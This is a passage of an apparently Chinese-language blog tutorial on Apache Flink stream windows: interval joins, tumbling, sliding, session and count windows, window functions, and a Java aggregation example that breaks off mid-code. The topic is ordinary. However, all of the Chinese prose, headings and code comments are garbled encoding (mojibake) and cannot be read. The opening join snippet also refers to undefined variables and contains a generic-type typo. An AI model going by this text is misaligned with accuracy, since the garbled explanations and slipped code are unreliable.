.intervalJoin(greenStream.keyBy(&lt;KeySelector&gt;))</span><br><span class="line">    .between(Time.milliseconds(-<span class="number">2</span>), Time.milliseconds(<span class="number">1</span>))</span><br><span class="line">    .process (<span class="keyword">new</span> ProcessJoinFunction&lt;Integer, Integer, String()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(Integer left, Integer right, Context ctx, Collector&lt;String&gt; out)</span> </span>&#123;</span><br><span class="line">            out.collect(first + <span class="string">&quot;,&quot;</span> + second);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="Flinkçš„Window"><a href="#Flinkçš„Window" class="headerlink" title="Flinkçš„Window"></a>Flinkçš„Window</h3><h4 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h4><blockquote><p><a href="https://blog.csdn.net/dongkang123456/article/details/108374799">Flink_Window</a></p></blockquote><h5 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h5><p><img src="https://img-blog.csdnimg.cn/20200903082944202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=Rzfw8&originHeight=228&originWidth=912&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>streamingæµå¼è®¡ç®—æ˜¯ä¸€ç§è¢«è®¾è®¡ç”¨äºå¤„ç†æ— é™æ•°æ®é›†çš„æ•°æ®å¤„ç†å¼•æ“ï¼Œè€Œæ— é™æ•°æ®é›†æ˜¯æŒ‡ä¸€ç§ä¸æ–­å¢é•¿çš„æœ¬è´¨ä¸Šæ— é™çš„æ•°æ®é›†ï¼Œè€Œ**windowæ˜¯ä¸€ç§åˆ‡å‰²æ— é™æ•°æ®ä¸ºæœ‰é™å—è¿›è¡Œå¤„ç†çš„æ‰‹æ®µ**ã€‚**Windowæ˜¯æ— é™æ•°æ®æµå¤„ç†çš„æ ¸å¿ƒï¼ŒWindowå°†ä¸€ä¸ªæ— é™çš„streamæ‹†åˆ†æˆæœ‰é™å¤§å°çš„â€bucketsâ€æ¡¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™äº›æ¡¶ä¸Šåšè®¡ç®—æ“ä½œ**ã€‚</code></pre><p><em>ä¸¾ä¾‹å­ï¼šå‡è®¾æŒ‰ç…§æ—¶é—´æ®µåˆ’åˆ†æ¡¶ï¼Œæ¥æ”¶åˆ°çš„æ•°æ®é©¬ä¸Šèƒ½åˆ¤æ–­æ”¾åˆ°å“ªä¸ªæ¡¶ï¼Œä¸”å¤šä¸ªæ¡¶çš„æ•°æ®èƒ½å¹¶è¡Œè¢«å¤„ç†ã€‚ï¼ˆè¿Ÿåˆ°çš„æ•°æ®ä¹Ÿå¯åˆ¤æ–­æ˜¯åŸæœ¬å±äºå“ªä¸ªæ¡¶çš„ï¼‰</em></p><h5 id="Windowç±»å‹"><a href="#Windowç±»å‹" class="headerlink" title="Windowç±»å‹"></a>Windowç±»å‹</h5><ul><li>æ—¶é—´çª—å£ï¼ˆTime Windowï¼‰ <ul><li>æ»šåŠ¨æ—¶é—´çª—å£</li><li>æ»‘åŠ¨æ—¶é—´çª—å£</li><li>ä¼šè¯çª—å£</li></ul></li><li>è®¡æ•°çª—å£ï¼ˆCount Windowï¼‰ <ul><li>æ»šåŠ¨è®¡æ•°çª—å£</li><li>æ»‘åŠ¨è®¡æ•°çª—å£</li></ul></li></ul><p><strong>TimeWindowï¼šæŒ‰ç…§æ—¶é—´ç”ŸæˆWindow</strong></p><p><strong>CountWindowï¼šæŒ‰ç…§æŒ‡å®šçš„æ•°æ®æ¡æ•°ç”Ÿæˆä¸€ä¸ªWindowï¼Œä¸æ—¶é—´æ— å…³</strong></p><hr><h6 id="æ»šåŠ¨çª—å£-Tumbling-Windows"><a href="#æ»šåŠ¨çª—å£-Tumbling-Windows" class="headerlink" title="æ»šåŠ¨çª—å£(Tumbling Windows)"></a>æ»šåŠ¨çª—å£(Tumbling Windows)</h6><p><img src="https://img-blog.csdnimg.cn/20200903083725483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=RF2Bi&originHeight=421&originWidth=822&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> ä¾æ®<strong>å›ºå®šçš„çª—å£é•¿åº¦</strong>å¯¹æ•°æ®è¿›è¡Œåˆ‡åˆ† </li><li> æ—¶é—´å¯¹é½ï¼Œçª—å£é•¿åº¦å›ºå®šï¼Œæ²¡æœ‰é‡å  </li></ul><h6 id="æ»‘åŠ¨çª—å£-Sliding-Windows"><a href="#æ»‘åŠ¨çª—å£-Sliding-Windows" class="headerlink" title="æ»‘åŠ¨çª—å£(Sliding Windows)"></a>æ»‘åŠ¨çª—å£(Sliding Windows)</h6><p><img src="https://img-blog.csdnimg.cn/20200903084127244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=Reyy3&originHeight=379&originWidth=817&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> å¯ä»¥æŒ‰ç…§å›ºå®šçš„é•¿åº¦å‘åæ»‘åŠ¨å›ºå®šçš„è·ç¦» </li><li> æ»‘åŠ¨çª—å£ç”±<strong>å›ºå®šçš„çª—å£é•¿åº¦</strong>å’Œ<strong>æ»‘åŠ¨é—´éš”</strong>ç»„æˆ </li><li> å¯ä»¥æœ‰é‡å (æ˜¯å¦é‡å å’Œæ»‘åŠ¨è·ç¦»æœ‰å…³ç³») </li><li> æ»‘åŠ¨çª—å£æ˜¯å›ºå®šçª—å£çš„æ›´å¹¿ä¹‰çš„ä¸€ç§å½¢å¼ï¼Œæ»šåŠ¨çª—å£å¯ä»¥çœ‹åšæ˜¯æ»‘åŠ¨çª—å£çš„ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼ˆå³çª—å£å¤§å°å’Œæ»‘åŠ¨é—´éš”ç›¸ç­‰ï¼‰ </li></ul><h6 id="ä¼šè¯çª—å£-Session-Windows"><a href="#ä¼šè¯çª—å£-Session-Windows" class="headerlink" title="ä¼šè¯çª—å£(Session Windows)"></a>ä¼šè¯çª—å£(Session Windows)</h6><p><img src="https://img-blog.csdnimg.cn/20200903085034747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=grS2X&originHeight=356&originWidth=782&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>ç”±ä¸€ç³»åˆ—äº‹ä»¶ç»„åˆä¸€ä¸ªæŒ‡å®šæ—¶é—´é•¿åº¦çš„timeouté—´éš™ç»„æˆï¼Œä¹Ÿå°±æ˜¯ä¸€æ®µæ—¶é—´æ²¡æœ‰æ¥æ”¶åˆ°æ–°æ•°æ®å°±ä¼šç”Ÿæˆæ–°çš„çª—å£</li><li>ç‰¹ç‚¹ï¼šæ—¶é—´æ— å¯¹é½</li></ul><h4 id="Window-API"><a href="#Window-API" class="headerlink" title="Window API"></a>Window API</h4><h5 id="æ¦‚è¿°-1"><a href="#æ¦‚è¿°-1" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h5><ul><li> çª—å£åˆ†é…å™¨â€”â€”<code>window()</code>æ–¹æ³• </li><li> æˆ‘ä»¬å¯ä»¥ç”¨<code>.window()</code>æ¥å®šä¹‰ä¸€ä¸ªçª—å£ï¼Œç„¶ååŸºäºè¿™ä¸ªwindowå»åšä¸€äº›èšåˆæˆ–è€…å…¶ä»–å¤„ç†æ“ä½œã€‚</li></ul><p><strong>æ³¨æ„</strong><code>**window()**</code><strong>æ–¹æ³•å¿…é¡»åœ¨keyByä¹‹åæ‰èƒ½ä½¿ç”¨</strong>ã€‚ </p><ul><li> Flinkæä¾›äº†æ›´åŠ ç®€å•çš„<code>.timeWindow()</code>å’Œ<code>.countWindow()</code>æ–¹æ³•ï¼Œç”¨äºå®šä¹‰æ—¶é—´çª—å£å’Œè®¡æ•°çª—å£ã€‚ </li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Tuple2&lt;String,Double&gt;&gt; minTempPerWindowStream = </span><br><span class="line">  datastream</span><br><span class="line">  .map(<span class="keyword">new</span> MyMapper())</span><br><span class="line">  .keyBy(data -&gt; data.f0)</span><br><span class="line">  .timeWindow(Time.seconds(<span class="number">15</span>))</span><br><span class="line">  .minBy(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h6 id="çª—å£åˆ†é…å™¨-window-assigner"><a href="#çª—å£åˆ†é…å™¨-window-assigner" class="headerlink" title="çª—å£åˆ†é…å™¨(window assigner)"></a>çª—å£åˆ†é…å™¨(window assigner)</h6><ul><li><code>window()</code>æ–¹æ³•æ¥æ”¶çš„è¾“å…¥å‚æ•°æ˜¯ä¸€ä¸ªWindowAssigner</li><li>WindowAssignerè´Ÿè´£å°†æ¯æ¡è¾“å…¥çš„æ•°æ®åˆ†å‘åˆ°æ­£ç¡®çš„windowä¸­</li><li>Flinkæä¾›äº†é€šç”¨çš„WindowAssigner <ul><li>æ»šåŠ¨çª—å£ï¼ˆtumbling windowï¼‰</li><li>æ»‘åŠ¨çª—å£ï¼ˆsliding windowï¼‰</li><li>ä¼šè¯çª—å£ï¼ˆsession windowï¼‰</li><li><strong>å…¨å±€çª—å£ï¼ˆglobal windowï¼‰</strong></li></ul></li></ul><h6 id="åˆ›å»ºä¸åŒç±»å‹çš„çª—å£"><a href="#åˆ›å»ºä¸åŒç±»å‹çš„çª—å£" class="headerlink" title="åˆ›å»ºä¸åŒç±»å‹çš„çª—å£"></a>åˆ›å»ºä¸åŒç±»å‹çš„çª—å£</h6><ul><li> æ»šåŠ¨æ—¶é—´çª—å£ï¼ˆtumbling time windowï¼‰<br><code>.timeWindow(Time.seconds(15))</code> </li><li> æ»‘åŠ¨æ—¶é—´çª—å£ï¼ˆsliding time windowï¼‰<br><code>.timeWindow(Time.seconds(15),Time.seconds(5))</code> </li><li> ä¼šè¯çª—å£ï¼ˆsession windowï¼‰<br><code>.window(EventTimeSessionWindows.withGap(Time.minutes(10)))</code> </li><li> æ»šåŠ¨è®¡æ•°çª—å£ï¼ˆtumbling count windowï¼‰<br><code>.countWindow(5)</code> </li><li> æ»‘åŠ¨è®¡æ•°çª—å£ï¼ˆsliding count windowï¼‰<br><code>.countWindow(10,2)</code> </li></ul><p><em>DataStreamçš„</em><code>_windowAll()_</code><em>ç±»ä¼¼åˆ†åŒºçš„globalæ“ä½œï¼Œè¿™ä¸ªæ“ä½œæ˜¯non-parallelçš„(å¹¶è¡Œåº¦å¼ºè¡Œä¸º1)ï¼Œæ‰€æœ‰çš„æ•°æ®éƒ½ä¼šè¢«ä¼ é€’åˆ°åŒä¸€ä¸ªç®—å­operatorä¸Šï¼Œå®˜æ–¹å»ºè®®å¦‚æœéå¿…è¦å°±ä¸è¦ç”¨è¿™ä¸ªAPI</em></p><h5 id="TimeWindow"><a href="#TimeWindow" class="headerlink" title="TimeWindow"></a>TimeWindow</h5><pre><code>TimeWindowå°†æŒ‡å®šæ—¶é—´èŒƒå›´å†…çš„æ‰€æœ‰æ•°æ®ç»„æˆä¸€ä¸ªwindowï¼Œä¸€æ¬¡å¯¹ä¸€ä¸ªwindowé‡Œé¢çš„æ‰€æœ‰æ•°æ®è¿›è¡Œè®¡ç®—ã€‚</code></pre><h6 id="æ»šåŠ¨çª—å£"><a href="#æ»šåŠ¨çª—å£" class="headerlink" title="æ»šåŠ¨çª—å£"></a>æ»šåŠ¨çª—å£</h6><pre><code>Flinké»˜è®¤çš„æ—¶é—´çª—å£æ ¹æ®ProcessingTimeè¿›è¡Œçª—å£çš„åˆ’åˆ†ï¼Œå°†Flinkè·å–åˆ°çš„æ•°æ®æ ¹æ®è¿›å…¥Flinkçš„æ—¶é—´åˆ’åˆ†åˆ°ä¸åŒçš„çª—å£ä¸­ã€‚</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Tuple2&lt;String, Double&gt;&gt; minTempPerWindowStream = dataStream </span><br><span class="line">  .map(<span class="keyword">new</span> MapFunction&lt;SensorReading, Tuple2&lt;String, Double&gt;&gt;() &#123; </span><br><span class="line">    <span class="meta">@Override</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Double&gt; <span class="title">map</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(value.getId(), value.getTemperature()); </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;) </span><br><span class="line">  .keyBy(data -&gt; data.f0) </span><br><span class="line">  .timeWindow( Time.seconds(<span class="number">15</span>) ) </span><br><span class="line">  .minBy(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><pre><code>æ—¶é—´é—´éš”å¯ä»¥é€šè¿‡`Time.milliseconds(x)`ï¼Œ`Time.seconds(x)`ï¼Œ`Time.minutes(x)`ç­‰å…¶ä¸­çš„ä¸€ä¸ªæ¥æŒ‡å®šã€‚</code></pre><h6 id="æ»‘åŠ¨çª—å£"><a href="#æ»‘åŠ¨çª—å£" class="headerlink" title="æ»‘åŠ¨çª—å£"></a>æ»‘åŠ¨çª—å£</h6><pre><code>æ»‘åŠ¨çª—å£å’Œæ»šåŠ¨çª—å£çš„å‡½æ•°åæ˜¯å®Œå…¨ä¸€è‡´çš„ï¼Œåªæ˜¯åœ¨ä¼ å‚æ•°æ—¶éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯window_sizeï¼Œä¸€ä¸ªæ˜¯sliding_sizeã€‚ä¸‹é¢ä»£ç ä¸­çš„sliding_sizeè®¾ç½®ä¸ºäº†5sï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯5så°±è®¡ç®—è¾“å‡ºç»“æœä¸€æ¬¡ï¼Œæ¯ä¸€æ¬¡è®¡ç®—çš„windowèŒƒå›´æ˜¯15så†…çš„æ‰€æœ‰å…ƒç´ ã€‚</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;SensorReading&gt; minTempPerWindowStream = dataStream </span><br><span class="line">  .keyBy(SensorReading::getId) </span><br><span class="line">  .timeWindow( Time.seconds(<span class="number">15</span>), Time.seconds(<span class="number">5</span>) ) </span><br><span class="line">  .minBy(<span class="string">&quot;temperature&quot;</span>);</span><br></pre></td></tr></table></figure><pre><code>æ—¶é—´é—´éš”å¯ä»¥é€šè¿‡`Time.milliseconds(x)`ï¼Œ`Time.seconds(x)`ï¼Œ`Time.minutes(x)`ç­‰å…¶ä¸­çš„ä¸€ä¸ªæ¥æŒ‡å®šã€‚</code></pre><h5 id="CountWindow"><a href="#CountWindow" class="headerlink" title="CountWindow"></a>CountWindow</h5><pre><code>CountWindowæ ¹æ®çª—å£ä¸­ç›¸åŒkeyå…ƒç´ çš„æ•°é‡æ¥è§¦å‘æ‰§è¡Œï¼Œæ‰§è¡Œæ—¶åªè®¡ç®—å…ƒç´ æ•°é‡è¾¾åˆ°çª—å£å¤§å°çš„keyå¯¹åº”çš„ç»“æœã€‚**æ³¨æ„ï¼šCountWindowçš„window_sizeæŒ‡çš„æ˜¯ç›¸åŒKeyçš„å…ƒç´ çš„ä¸ªæ•°ï¼Œä¸æ˜¯è¾“å…¥çš„æ‰€æœ‰å…ƒç´ çš„æ€»æ•°ã€‚**</code></pre><h6 id="æ»šåŠ¨çª—å£-1"><a href="#æ»šåŠ¨çª—å£-1" class="headerlink" title="æ»šåŠ¨çª—å£"></a>æ»šåŠ¨çª—å£</h6><pre><code>é»˜è®¤çš„CountWindowæ˜¯ä¸€ä¸ªæ»šåŠ¨çª—å£ï¼Œåªéœ€è¦æŒ‡å®šçª—å£å¤§å°å³å¯ï¼Œ**å½“å…ƒç´ æ•°é‡è¾¾åˆ°çª—å£å¤§å°æ—¶ï¼Œå°±ä¼šè§¦å‘çª—å£çš„æ‰§è¡Œ**ã€‚</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;SensorReading&gt; minTempPerWindowStream = dataStream </span><br><span class="line">  .keyBy(SensorReading::getId) </span><br><span class="line">  .countWindow( <span class="number">5</span> ) </span><br><span class="line">  .minBy(<span class="string">&quot;temperature&quot;</span>);</span><br></pre></td></tr></table></figure><h6 id="æ»‘åŠ¨çª—å£-1"><a href="#æ»‘åŠ¨çª—å£-1" class="headerlink" title="æ»‘åŠ¨çª—å£"></a>æ»‘åŠ¨çª—å£</h6><pre><code>æ»‘åŠ¨çª—å£å’Œæ»šåŠ¨çª—å£çš„å‡½æ•°åæ˜¯å®Œå…¨ä¸€è‡´çš„ï¼Œåªæ˜¯åœ¨ä¼ å‚æ•°æ—¶éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯window_sizeï¼Œä¸€ä¸ªæ˜¯sliding_sizeã€‚ä¸‹é¢ä»£ç ä¸­çš„sliding_sizeè®¾ç½®ä¸ºäº†2ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ”¶åˆ°ä¸¤ä¸ªç›¸åŒkeyçš„æ•°æ®å°±è®¡ç®—ä¸€æ¬¡ï¼Œæ¯ä¸€æ¬¡è®¡ç®—çš„windowèŒƒå›´æ˜¯10ä¸ªå…ƒç´ ã€‚</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;SensorReading&gt; minTempPerWindowStream = dataStream </span><br><span class="line">  .keyBy(SensorReading::getId) </span><br><span class="line">  .countWindow( <span class="number">10</span>, <span class="number">2</span> ) </span><br><span class="line">  .minBy(<span class="string">&quot;temperature&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id="window-function"><a href="#window-function" class="headerlink" title="window function"></a>window function</h5><p>window function å®šä¹‰äº†è¦å¯¹çª—å£ä¸­æ”¶é›†çš„æ•°æ®åšçš„è®¡ç®—æ“ä½œï¼Œä¸»è¦å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼š</p><ul><li>å¢é‡èšåˆå‡½æ•°ï¼ˆincremental aggregation functionsï¼‰</li><li>å…¨çª—å£å‡½æ•°ï¼ˆfull window functionsï¼‰</li></ul><h6 id="å¢é‡èšåˆå‡½æ•°"><a href="#å¢é‡èšåˆå‡½æ•°" class="headerlink" title="å¢é‡èšåˆå‡½æ•°"></a>å¢é‡èšåˆå‡½æ•°</h6><ul><li><strong>æ¯æ¡æ•°æ®åˆ°æ¥å°±è¿›è¡Œè®¡ç®—</strong>ï¼Œä¿æŒä¸€ä¸ªç®€å•çš„çŠ¶æ€ã€‚ï¼ˆæ¥ä¸€æ¡å¤„ç†ä¸€æ¡ï¼Œä½†æ˜¯ä¸è¾“å‡ºï¼Œåˆ°çª—å£ä¸´ç•Œä½ç½®æ‰è¾“å‡ºï¼‰</li><li>å…¸å‹çš„å¢é‡èšåˆå‡½æ•°æœ‰ReduceFunction, AggregateFunctionã€‚</li></ul><h6 id="å…¨çª—å£å‡½æ•°"><a href="#å…¨çª—å£å‡½æ•°" class="headerlink" title="å…¨çª—å£å‡½æ•°"></a>å…¨çª—å£å‡½æ•°</h6><ul><li><strong>å…ˆæŠŠçª—å£æ‰€æœ‰æ•°æ®æ”¶é›†èµ·æ¥ï¼Œç­‰åˆ°è®¡ç®—çš„æ—¶å€™ä¼šéå†æ‰€æœ‰æ•°æ®</strong>ã€‚ï¼ˆæ¥ä¸€ä¸ªæ”¾ä¸€ä¸ªï¼Œçª—å£ä¸´ç•Œä½ç½®æ‰éå†ä¸”è®¡ç®—ã€è¾“å‡ºï¼‰</li><li>ProcessWindowFunctionï¼ŒWindowFunctionã€‚</li></ul><h5 id="å…¶å®ƒå¯é€‰API"><a href="#å…¶å®ƒå¯é€‰API" class="headerlink" title="å…¶å®ƒå¯é€‰API"></a>å…¶å®ƒå¯é€‰API</h5><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106359443">Flink-Windowæ¦‚è¿° | Windowç±»å‹ | TimeWindowã€CountWindowã€SessionWindowã€WindowFunction</a></p></blockquote><ul><li> <code>.trigger()</code> â€”â€”è§¦å‘å™¨<br>å®šä¹‰window ä»€ä¹ˆæ—¶å€™å…³é—­ï¼Œè§¦å‘è®¡ç®—å¹¶è¾“å‡ºç»“æœ </li><li> <code>.evitor()</code> â€”â€”ç§»é™¤å™¨<br>å®šä¹‰ç§»é™¤æŸäº›æ•°æ®çš„é€»è¾‘ </li><li> <code>.allowedLateness()</code> â€”â€”å…è®¸å¤„ç†è¿Ÿåˆ°çš„æ•°æ® </li><li> <code>.sideOutputLateData()</code> â€”â€”å°†è¿Ÿåˆ°çš„æ•°æ®æ”¾å…¥ä¾§è¾“å‡ºæµ </li><li> <code>.getSideOutput()</code> â€”â€”è·å–ä¾§è¾“å‡ºæµ </li></ul><p><img src="https://img-blog.csdnimg.cn/20200526181340668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=f65qz&originHeight=435&originWidth=781&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="ä»£ç æµ‹è¯•"><a href="#ä»£ç æµ‹è¯•" class="headerlink" title="ä»£ç æµ‹è¯•"></a>ä»£ç æµ‹è¯•</h5><blockquote><p><a href="https://www.cnblogs.com/yangshibiao/p/14133628.html">Flinkä¹‹Windowçš„ä½¿ç”¨ï¼ˆ2ï¼‰ï¼šæ—¶é—´çª—å£</a></p></blockquote><ol><li> æµ‹è¯•æ»šåŠ¨æ—¶é—´çª—å£çš„<strong>å¢é‡èšåˆå‡½æ•°</strong><br>å¢é‡èšåˆå‡½æ•°ï¼Œç‰¹ç‚¹å³æ¯æ¬¡æ•°æ®è¿‡æ¥éƒ½å¤„ç†ï¼Œä½†æ˜¯<strong>åˆ°äº†çª—å£ä¸´ç•Œæ‰è¾“å‡ºç»“æœ</strong>ã€‚ </li></ol><ul><li><p> ç¼–å†™javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.window;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.TumblingProcessingTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 7:14 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowTest1_TimeWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¹¶è¡Œåº¦è®¾ç½®1ï¼Œæ–¹ä¾¿çœ‹ç»“æœ</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//        // ä»æ–‡ä»¶è¯»å–æ•°æ®</span></span><br><span class="line">    <span class="comment">//        DataStream&lt;String&gt; dataStream = env.readTextFile(&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»socketæ–‡æœ¬æµè·å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¼€çª—æµ‹è¯•</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. å¢é‡èšåˆå‡½æ•° (è¿™é‡Œç®€å•ç»Ÿè®¡æ¯ä¸ªkeyç»„é‡Œä¼ æ„Ÿå™¨ä¿¡æ¯çš„æ€»æ•°)</span></span><br><span class="line">    DataStream&lt;Integer&gt; resultStream = dataStream.keyBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      <span class="comment">//                .countWindow(10, 2);</span></span><br><span class="line">      <span class="comment">//                .window(EventTimeSessionWindows.withGap(Time.minutes(1)));</span></span><br><span class="line">      <span class="comment">//                .window(TumblingProcessingTimeWindows.of(Time.seconds(15)))</span></span><br><span class="line">      <span class="comment">//                .timeWindow(Time.seconds(15)) // å·²ç»ä¸å»ºè®®ä½¿ç”¨@Deprecated</span></span><br><span class="line">      .window(TumblingProcessingTimeWindows.of(Time.seconds(<span class="number">15</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> AggregateFunction&lt;SensorReading, Integer, Integer&gt;() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ–°å»ºçš„ç´¯åŠ å™¨</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¯ä¸ªæ•°æ®åœ¨ä¸Šæ¬¡çš„åŸºç¡€ä¸Šç´¯åŠ 